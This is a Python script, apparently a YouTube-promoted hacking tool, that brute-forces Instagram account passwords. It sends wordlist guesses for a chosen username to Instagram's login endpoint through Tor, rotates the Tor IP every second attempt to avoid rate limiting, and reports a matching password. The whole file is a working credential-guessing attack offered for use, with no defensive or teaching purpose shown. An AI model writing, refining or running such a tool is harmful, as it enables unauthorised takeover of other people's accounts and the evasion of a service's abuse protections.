import requests
import webbrowser
import time
from stem import Signal
from stem.control import Controller
import sys
import os

# 🔷 Banner (Termux friendly)
print("""
   ______     __     ______   ______     ______   __  __  ______
  /\\  ___\\   /\\ \\   /\\__  _\\ /\\  __ \\   /\\__  _\\ /\\ \\_\\ \\/\\  ___\\
  \\ \\ \\____  \\ \\ \\  \\/_/\\ \\/ \\ \\ \\/\\ \\  \\/_/\\ \\/ \\ \\  __ \\ \\___  \\
   \\ \\_____\\  \\ \\_\\    \\ \\_\\  \\ \\_____\\    \\ \\_\\  \\ \\_\\ \\_\\/\\_____\\
    \\/_____/   \\/_/     \\/_/   \\/_____/     \\/_/   \\/_/\\/_/\\/_____/

                            [ CYBERSMITS ]                                    """)

# 💠 Tool Info Banner
print("""
╔══════════════════════════════════════════╗
║         🚀  CYBERSMITS TOOL v1.0         ║
╠══════════════════════════════════════════╣
║  🔐 INSTAGRAM BRUTEFORCER USING TOR      ║
║  🧑‍💻 Created by: CyberSmits (YouTube)     ║
║  🎬 Watch & Subscribe:                   ║
║  👉 https://www.youtube.com/@cybersmiths_team      ║
╚══════════════════════════════════════════╝
""")

# 🔴 Require subscription confirmation
confirm = input("📌 Have you subscribed to the channel? (yes/no): ").strip().lower()
if confirm != "yes":
    print("❌ You must subscribe to CyberSmits YouTube channel to use this tool.")
    print("➡️ Redirecting you to: https://www.youtube.com/@cybersmiths_team")
    try:
        webbrowser.open("https://www.youtube.com/@cybersmiths_team")
    except:
        try:
            os.system("termux-open-url https://www.youtube.com/@cybersmiths_team")
        except:
            print("🔗 Please open manually: https://www.youtube.com/@cybersmiths_team")
    sys.exit()

# Tor proxy settings
proxies = {
    'http': 'socks5h://127.0.0.1:9050',
    'https': 'socks5h://127.0.0.1:9050'
}

# Get user inputs
username = input("Enter your Instagram username: ")
wordlist_path = input("Enter path to your wordlist (e.g., w.txt): ")

# Load passwords
try:
    with open(wordlist_path, "r") as f:
        passwords = [line.strip() for line in f if line.strip()]
except FileNotFoundError:
    print("❌ Wordlist file not found.")
    exit()

# 🔁 Change IP via Tor
def change_ip():
    try:
        with Controller.from_port(port=9051) as controller:
            controller.authenticate()  # default is cookie authentication
            controller.signal(Signal.NEWNYM)
            print("🔁 New Tor IP requested.\n")
            time.sleep(5)
    except Exception as e:
        print(f"❌ Failed to change IP: {e}")

# Start brute force loop
session = requests.Session()
attempt = 0

for password in passwords:
    attempt += 1
    print(f"\n🔐 Trying password: {password} (Attempt {attempt})")

    if attempt % 2 == 0:
        change_ip()

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Referer": "https://www.instagram.com/accounts/login/",
        "X-Requested-With": "XMLHttpRequest",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.9"
    }

    try:
        r = session.get("https://www.instagram.com/accounts/login/", headers=headers, proxies=proxies)
        csrf_token = r.cookies.get_dict().get('csrftoken')
    except Exception as e:
        print(f"❌ Error fetching CSRF token: {e}")
        continue

    if not csrf_token:
        print("❌ Could not get CSRF token.")
        continue

    headers["X-CSRFToken"] = csrf_token
    headers["Content-Type"] = "application/x-www-form-urlencoded"
    enc_password = f"#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{password}"

    payload = {
        "username": username,
        "enc_password": enc_password,
        "queryParams": "{}",
        "optIntoOneTap": "false",
        "stopDeletionNonce": "",
        "trustedDeviceRecords": "{}"
    }

    try:
        res = session.post("https://www.instagram.com/accounts/login/ajax/",
                           data=payload, headers=headers,
                           proxies=proxies, allow_redirects=True)

        if res.status_code == 200:
            result = res.json()
            if result.get("authenticated"):
                print(f"\n✅ Password found: {password}")
                break
            elif result.get("message") == "checkpoint_required":
                print("🔐 Checkpoint hit! Password might be correct, but verification required.")
                break
            else:
                print("❌ Incorrect password.")
        else:
            print(f"⚠️ Request failed: HTTP {res.status_code}")
    except Exception as e:
        print(f"❌ Error in login attempt: {e}")
